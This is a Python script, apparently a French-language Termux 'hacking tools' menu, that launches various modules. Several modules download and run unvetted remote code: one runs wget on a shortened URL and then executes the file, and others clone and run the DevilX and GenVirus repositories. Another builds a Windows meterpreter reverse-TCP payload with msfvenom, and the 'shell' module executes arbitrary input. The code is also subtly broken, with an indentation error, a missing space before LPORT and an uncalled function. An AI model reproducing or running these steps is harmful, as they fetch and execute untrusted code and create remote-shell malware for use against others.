import random
import os
import webbrowser
os.system("clear") 
print("\033[1;32") 

a =input("mmodule: ")

webbrowser.open("https://github.com/EvilhackDKP")

def shell():
	while a =="shell":
		shell =input("shell.EvilhackDKP~$")
		os.system(shell)
		os.system("python3 Null-tools-in-python.py")

	
def pwd():	
	if a =="pwd securited":
		demande_length_for_pass =input("quelle est la longeur du mot de passe: 		")	
		lower_case ="abcdefghijklmnopqrstuvwxyz"
		upper_case ="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		number ="0123456789"
		symbole ="@#€&_-()=%*':/!?+$€¥¢¤©®™~¿[]{}<>«»¡`;÷\|¦¬^×§¶°"
		use_for =lower_case + upper_case + number + symbole
		length_for_pass =int(demande_length_for_pass)
		password ="".join(random.sample(use_for, length_for_pass))
		print("your generated password is: " + password)
		os.system("python3 Null-tools-in-python.py")
		

def nh():		
	if a =="install nh":
		print("ce module n'est que pour termux")
		os.system("apt update && apt upgrade")
		os.system("apt install wget")
		os.system("wget -O install-nethunter-termux https://off.ec/2MczZWr")
		os.system("chmod +x install-nethunter-termux")
		os.system("./install-nethunter-termux")
		print("repondre n a delete roots file ")
		os.system("nh")
		os.system("ls")
		ip =input("ip: ")	
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + "LPORT=4444 -f exe -o payload.exe")
		os.system("python3 Null-tools-in-python.py")
	
def interpreter():	
	if a =="interpreter":
		os.system("python3")
		os.system("python3 Null-tools-in-python.py")
	
def fake_help():	
	if a =="help":
		print("pas help mais help()")
		os.system("python3 Null-tools-in-python.py")
	
	
def help():
	if a =="help()":
		print("shell:terminal python")
		print("pwd securited:mot de passe securise")
		print("install nh:install nethunter sur termux")
		print("interpreter:interpreter python3")
		print("time: donne l'heure")
		print("devilx: installe devilx")
		print("open link: ouvre mon github ;)")
		os.system("python3 Null-tools-in-python.py")
	
def devilx():
	if a == "devilx":
		os.system("pkg update")
		os.system("pkg upgrade")
		os.system("pkg install git")
		os.system("git clone https://github.com/MrHacker-X/DevilX.git")
		os.system("cd DevilX")
		os.system("chmod +x *")
		os.system("bash setup.sh")
		os.system("python3 Null-tools-in-python.py")
		
def open_lien():
		webbrowser.open("https://github.com/EvilhackDKP")
		webbrowser.open("https://f-droid.org/fr/")
		webbrowser.open("")
	        os.system("python3 Null-tools-in-python.py")
	
def time():	
	if a == "time":
		os.system("uptime")
		os.system("python3 Null-tools-in-python.py")

def genvirus():
	os.system("apt update ; apt install git -y ; git clone git://github.com/Ign0r3dH4x0r/GenVirus.git ; cd GenVirus ; bash GenVirus.sh")
	os.system("python3 Null-tools-in-python.py")
	
	
	
if a == "time":
	time()

if a == "help()":
	help()
	
	
if a == "help":
	fake_help()
	
	
if a == "interpreter":
	interpreter()
	
	
if a == "install nh":
	nh()
	
	
if a == "pwd securited":
	pwd()
	
	
if a == "shell": 
	shell()

if a =="devilx":
	devilx()
	
if a =="open link":
	open_lien()
